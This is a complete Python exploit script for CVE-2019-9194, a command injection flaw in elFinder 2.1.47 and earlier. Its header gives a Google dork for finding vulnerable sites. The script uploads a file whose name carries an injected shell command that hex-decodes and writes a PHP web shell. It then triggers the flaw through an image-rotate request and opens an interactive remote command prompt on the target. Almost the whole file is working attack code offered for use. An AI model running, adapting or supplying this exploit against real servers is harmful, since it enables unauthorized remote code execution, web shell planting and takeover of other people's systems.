#!/usr/bin/python

'''
# Exploit Title: elFinder <= 2.1.47 - Command Injection vulnerability in the PHP connector.
# Date: 26/02/2019
# Exploit Author: @q3rv0
# Vulnerability reported by: Thomas Chauchefoin
# Google Dork: intitle:"elFinder 2.1.x"
# Vendor Homepage: https://studio-42.github.io/elFinder/
# Software Link: https://github.com/Studio-42/elFinder/archive/2.1.47.tar.gz
# Version: <= 2.1.47
# Tested on: Linux 64bit + Python2.7
# PoC: https://www.secsignal.org/news/cve-2019-9194-triggering-and-exploiting-a-1-day-vulnerability/
# CVE: CVE-2019-9194

# Usage: python exploit.py [URL]

'''

import requests

import json

import sys


payload = 'SecSignal.jpg;echo 3c3f7068702073797374656d28245f4745545b2263225d293b203f3e0a | xxd -r -p > SecSignal.php;echo SecSignal.jpg'


def usage():

    if len(sys.argv) != 2:

        print "Usage: python exploit.py [URL]"

        sys.exit(0)


def upload(url, payload):

    files = {'upload[]': (payload, open('SecSignal.jpg', 'rb'))}

    data = {"reqid" : "1693222c439f4", "cmd" : "upload", "target" : "l1_Lw", "mtime[]" : "1497726174"}

    r = requests.post("%s/php/connector.minimal.php" % url, files=files, data=data)

    j = json.loads(r.text)

    return j['added'][0]['hash']


def imgRotate(url, hash):

    r = requests.get("%s/php/connector.minimal.php?target=%s&width=539&height=960&degree=180&quality=100&bg=&mode=rotate&cmd=resize&reqid=169323550af10c" % (url, hash))

    return r.text


def shell(url):

    r = requests.get("%s/php/SecSignal.php" % url)

    if r.status_code == 200:

       print "[+] Pwned! :)"

       print "[+] Getting the shell..."

       while 1:

           try:

               input = raw_input("$ ")

               r = requests.get("%s/php/SecSignal.php?c=%s" % (url, input))

               print r.text

           except KeyboardInterrupt:

               sys.exit("\nBye kaker!")

    else:

        print "[*] The site seems not to be vulnerable :("


def main():

    usage()

    url = sys.argv[1]

    print "[*] Uploading the malicious image..."

    hash = upload(url, payload)

    print "[*] Running the payload..."

    imgRotate(url, hash)

    shell(url)


if __name__ == "__main__":

    main()
            
